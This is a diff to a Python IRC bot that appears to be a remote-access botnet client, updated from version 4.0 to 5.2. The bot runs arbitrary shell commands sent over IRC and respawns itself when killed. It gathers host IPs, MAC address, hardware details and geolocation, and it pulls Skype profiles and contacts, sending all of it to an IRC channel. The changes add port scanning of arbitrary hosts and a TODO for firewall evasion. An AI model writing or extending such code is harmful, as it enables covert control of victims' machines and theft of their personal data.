@@ -12,7 +12,6 @@ import signal
 import time
 import os
 import sys
-#import subprocess
 import urllib2
 import unicodedata
 import json
@@ -20,7 +19,9 @@ from subprocess import Popen, PIPE, STDOUT
 from time import strftime, sleep
 from StringIO import StringIO
 
-#TODO: make skype.findProfile select the largest main.db, instead of failing if there is more than 1
+from modules.logging import logfile, log
+
+#TODO: make skype.findProfiles select the largest main.db, instead of failing if there is more than 1
 #TODO: make run fully interactive by capturing input and using p.write() or p.stdin()
 #TODO: modules:
 #       download    will download the file at the given url and save it to the host machine
@@ -29,23 +30,9 @@ from StringIO import StringIO
 #       status      returns the size of the worker's task queue
 #       openvpn     implement openvpn for firewall evasion
 
-version = "4.0"                                                   # bot version
+version = "5.2"                                                   # bot version
 
-#### Remove/comment this block to disable logging stdout/err to a file
-#so = se = open("bot_v%s.log" % version, 'w', 0)
-## re-open stdout without buffering
-#sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)
-## redirect stdout and stderr to the log file
-#os.dup2(so.fileno(), sys.stdout.fileno())
-#os.dup2(se.fileno(), sys.stderr.fileno())
-#### Endblock
-
-def log(prefix, content=''):                                      # function used to log things to stdout with a timestamp
-    try:
-        for line in content.split('\n'):
-            print('[%s] %s%s' % (strftime("%Y-%m-%d %H:%M:%S"), prefix, line))
-    except:
-        print('[%s] %s%s' % (strftime("%Y-%m-%d %H:%M:%S"), prefix, content))
+#logfile(filename="bot_v%s.log" % version)                         # redirects bot output to logfile
 
 log("[*] IRC BOT v%s" % version)
 
@@ -99,7 +86,7 @@ def sigterm_handler(signum, frame):                                           # 
     quit_status = True
     cmd = "sleep 15; python bot.py &"
     log('[>]    CMD:     ',cmd)
-    p = subprocess.Popen([cmd],shell=True,executable='/bin/bash')
+    p = Popen([cmd],shell=True,executable='/bin/bash')
     log('[#] ----Subprocess Spawned----')
     privmsg('----Subprocess Spawned----')
     irc.send ( 'QUIT\r\n' )
@@ -195,13 +182,135 @@ def broadcast(msg):                                               # function to 
 
 ############ Keyword functions
 
-load_modules()
+from modules import skype
+from modules import network
+from modules import communication
+
+def geo_locate(ip="",with_proxy=False):                                                   # fetch location based on IP
+    signal.signal(signal.SIGALRM, timeout_handler)
+    signal.alarm(5)
+    try:
+        if with_proxy:
+            geo_json = urllib2.urlopen('http://freegeoip.net/json/').read()
+        else:
+            proxy_handler = urllib2.ProxyHandler({})
+            opener = urllib2.build_opener(proxy_handler)
+            req = urllib2.Request('http://freegeoip.net/json/%s' % ip)
+            r = opener.open(req)
+            geo_json = r.read()
+    except Exception as e:
+        signal.alarm(0)
+        if str(e).find("404") != -1:
+            return ["No location info available for IP","","","","",""]
+        return ["failed: %s" % e,"","","","",""]
+    signal.alarm(0)
+
+    geo = json.loads(geo_json)
+
+    city = geo[u"city"].encode('utf-8')
+    region = geo[u"region_name"].encode('utf-8')
+    country = geo[u"country_name"].encode('utf-8')
+    zipcode = geo[u"zipcode"].encode('utf-8')
+
+    lat = geo[u"latitude"]
+    lng = geo[u"longitude"]
+
+    return [city,country,region,zipcode,lat,lng]
+
+def identify():                                                   # give some identifying info about the host computer
+    log('[+] Running v%s Identification Modules...' % version)
+    system = platform.mac_ver()[0]
+    if len(str(system)) < 1:
+        system = platform.platform()
+        log('[>]    System:    ',system)
+    else:
+        log('[>]    OS X:    ',system)
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8",80))
+    local_ip = s.getsockname()[0]
+    s.close()
+    log('[>]    Local:   ',local_ip)
+    public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
+    log('[>]    Public:  ',public_ip)
+    mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
+    log('[>]    MAC:     ',mac_addr)
+    return "[v%s/x%s] %s@%s u: %s l: %s p: %s MAC: %s" % (version, system.strip(), local_user, hostname, main_user, local_ip, public_ip, mac_addr)
+ 
+def full_identify():                                              # give verbose identifying info about the host computer
+    log('[+] Running v%s Identification Modules...' % version)
+    privmsg('[+] Running v%s Identification Modules...' % version)
+    system = platform.mac_ver()[0]
+    if len(str(system)) < 1:
+        system = platform.platform()
+        log('[>]    System:    ',system)
+        privmsg('[>]      System:    %s' % system)
+    else:
+        log('[>]    OS X:    ',system)
+        privmsg('[>]      OS X:    %s' % system)
+
+    log('[>]    Bot:    ',local_user)
+    privmsg('[>]      Bot:    %s' % local_user)
+
+    log('[>]    User:    ',main_user)
+    privmsg('[>]      User:    %s' % main_user)
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8",80))
+    local_ip = s.getsockname()[0]
+    s.close()
+    log('[>]    Local:   ',local_ip)
+    privmsg('[>]      Local:   %s' % local_ip)
+
+    public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
+    log('[>]    Public:  ',public_ip)
+    privmsg('[>]      Public:  %s' % public_ip)
+    
+    mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
+    log('[>]    MAC:     ',mac_addr)
+    privmsg('[>]      MAC:     %s' % mac_addr)
+    
+    cmd = "system_profiler SPPowerDataType | grep Connected"
+    for line in run_shell(cmd):
+        log('[>]    Power:    ',line)
+        privmsg('[>]      Power:    %s' % line)
+    
+    cmd = "uptime"
+    for line in run_shell(cmd):
+        log('[>]    UP:    ',line)
+        privmsg('[>]      Up:    %s' % line)
+
+    geo_info = geo_locate()
+    location = geo_info[0]+", "+geo_info[1]+" ("+str(geo_info[4])+", "+str(geo_info[5])+")"
+
+    log('[>]    Geoip:    ',location)
+    privmsg('[>]      Location:    %s' % location)
+
+    try:
+        db_path = skype.findProfiles(local_user)
+        log('[>]    Skype:    ')
+        privmsg('[>]      Skype:')
+        for line in skype.skypeProfile(db_path):
+            log('[>]              ',line)
+            privmsg('[>]         %s' % line)
+            sleep(1)
+    except:
+        log('[>]    Skype:    None Found.')
+        privmsg('[>]      Skype:    None Found.')
+    
+    cmd = "system_profiler SPHardwareDataType"
+    log('[>]    CMD:     ',cmd)
+    p = Popen([cmd],shell=True, stdout=PIPE, stderr=STDOUT, executable='/bin/bash')
+    hardware = p.stdout.read()
+    log('[>]    Hardware.')
+    privmsg(str(hardware))
+    
+    privmsg('[√] Done.')
 
 def run_shell(cmd, timeout=60, verbose=False):                    # run a shell command and return the output, verbose enables live command output via yield
     signal.signal(signal.SIGALRM, timeout_handler)
     signal.alarm(timeout)
     try:
-        p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
+        p = Popen([cmd],shell=True, stdout=PIPE, stderr=STDOUT, executable='/bin/bash')
         log("[$]   Started.")
         continue_running = True
     except Exception as e:
@@ -412,7 +521,7 @@ if __name__ == '__main__':
                         privmsg('----Reloading Bot from file bot.py----')
                         cmd = "sleep 5; python bot.py &"
                         log('[>]    CMD:     ',cmd)
-                        p = subprocess.Popen([cmd],shell=True,executable='/bin/bash')
+                        p = Popen([cmd],shell=True,executable='/bin/bash')
                         log('[#] ----New Process Spawned----')
                         privmsg('----New Process Spawned----')
                         quit_status = True
@@ -441,13 +550,29 @@ if __name__ == '__main__':
 
                         elif content == '!skype':
                             try:
-                                broadcast(skype.findProfile(local_user))
-                                db_path = skype.findProfile(local_user)
-                                for line in skype.printProfile(db_path):
+                                broadcast(skype.findProfiles(local_user))
+                                db_path = skype.findProfiles(local_user)
+                                for line in skype.skypeProfile(db_path):
                                     broadcast(line)
                                     sleep(1)
                             except Exception as error:
                                 broadcast(str(error))
+
+                        elif content == '!portscan':
+                            log("[+] Starting Portscan of localhost.")
+                            for line in network.portscan('localhost'):
+                                log("[>]    %s" % line)
+                                if str(line)[:1] == "[":
+                                    broadcast(line)
+                            log("[+] Finished Portscan.")
+
+                        elif content[:9] == 'portscan$':
+                            log("[+] Starting Portscan of %s." % content[9:])
+                            for line in network.portscan(content[9:]):
+                                log("[>]    %s" % line)
+                                if str(line)[:1] == "[":
+                                    broadcast(line)
+                            log("[+] Finished Portscan.")
 
                         elif content[:1] == '$':
                             cmd = content[1:]
@@ -480,11 +605,11 @@ if __name__ == '__main__':
                                 sleep(1)
                                 privmsg("Actual Location: %s" % location,to=return_to)
 
-                        elif content == 'skype$profile':
+                        elif content == 'skype$profiles':
                             try:
-                                privmsg(skype.findProfile(local_user), to=return_to)
-                                db_path = skype.findProfile(local_user)
-                                for line in skype.printProfile(db_path):
+                                paths = skype.findProfiles()
+                                privmsg(paths, to=return_to)
+                                for line in skype.skypeProfile(paths):
                                     privmsg(line, to=return_to)
                                     sleep(1)
                             except Exception as error:
@@ -492,8 +617,8 @@ if __name__ == '__main__':
 
                         elif content == 'skype$contacts':
                             try:
-                                db_path = skype.findProfile(local_user)
-                                for line in skype.printProfile(db_path):
+                                db_path = skype.findProfiles(local_user)
+                                for line in skype.skypeProfile(db_path):
                                     privmsg(line, to=return_to)
                                     sleep(1)
                                 for line in skype.printContacts(db_path):
@@ -539,7 +664,21 @@ if __name__ == '__main__':
                             except Exception as python_exception:
                                 privmsg("[X]: %s" % python_exception, return_to)
 
+                        elif content == 'portscan':
+                            log("[+] Starting Portscan of localhost.")
+                            for line in network.portscan('localhost'):
+                                privmsg(line, return_to)
+                            log("[+] Finished Portscan.")
+
+                        elif content[:9] == 'portscan$':
+                            log("[+] Starting Portscan of %s." % content[9:])
+                            for line in network.portscan(content[9:]):
+                                privmsg(line, return_to)
+                            log("[+] Finished Portscan.")
+
         except (KeyboardInterrupt, SystemExit):
+            privmsg('Quitting due to KeyboardInterrupt/SystemExit.')
+            irc.send('QUIT\r\n')
             break
         except Exception as exit_exception:
             log("[#] ----EXCEPTION---- ",exit_exception)
